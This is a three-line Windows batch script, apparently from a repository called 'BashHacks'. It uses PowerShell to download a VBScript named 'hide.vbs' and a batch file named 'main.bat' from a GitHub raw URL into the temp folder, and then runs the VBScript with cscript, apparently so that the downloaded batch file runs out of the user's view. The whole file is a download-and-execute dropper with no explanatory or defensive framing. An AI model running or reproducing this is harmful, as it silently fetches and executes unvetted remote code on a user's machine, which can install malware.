powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FGabi01/BashHacks/master/hide.vbs -OutFile %temp%\hide.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FGabi01/BashHacks/master/main.bat -OutFile %temp%\main.bat"
start "" cmd /c cscript %temp%\hide.vbs
